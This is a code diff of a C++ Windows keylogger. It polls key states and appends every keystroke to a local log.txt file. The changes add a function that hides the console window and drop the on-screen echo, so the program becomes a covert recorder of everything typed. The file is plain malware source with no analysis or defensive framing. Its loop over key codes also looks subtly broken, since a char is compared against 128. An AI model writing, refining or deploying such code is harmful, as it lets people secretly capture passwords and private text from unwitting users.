@@ -1,27 +1,15 @@
 #include <windows.h>
-#include <string>
+#include <fstream>
 #include <iostream>
 
 using namespace std;
-
-
-int Save(int key, char *d);
-
-int main()
+void HideConsole()
 {
-	char file1[8] = "log.txt";
-	while (true) {
-		for (char i = 8; i < 256; i++)
-		{
-			if (GetAsyncKeyState(i) == -32767) Save(i, file1);
-		}
-	}
-	return 0;
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
-
-int Save(int key, char *d)
+int Save(int key, char* d)
 {
-	cout << key << endl;
+	Sleep(10);
 	FILE* OUTPUT;
 	OUTPUT = fopen(d, "a+");
 	if (key == VK_SHIFT)  fprintf(OUTPUT, "%s", "[SH]");
@@ -40,9 +28,22 @@ int Save(int key, char *d)
 	else if (key == VK_NUMPAD8) fprintf(OUTPUT, "%s", "8");
 	else if (key == VK_NUMPAD9) fprintf(OUTPUT, "%s", "9");
 	else if (key == VK_MULTIPLY) fprintf(OUTPUT, "%s", "*");
-	else if (key == VK_ADD) fprintf(OUTPUT, "%s", "+"); 
-	else if (key == VK_SUBTRACT) fprintf(OUTPUT, "%s", "-");
+	else if (key == VK_ADD) fprintf(OUTPUT, "%s", "+");
 	else fprintf(OUTPUT, "%s", &key);
 	fclose(OUTPUT);
+	return 0;
+}
+
+int main()
+{
+	HideConsole();
+	char file1[10] = "log.txt";
+	while (true) {
+		Sleep(100);
+		for (char i = 8; i < 128; i++)
+		{
+			if (GetAsyncKeyState(i) == -32767) Save(i, file1);
+		}
+	}
 	return 0;
 }
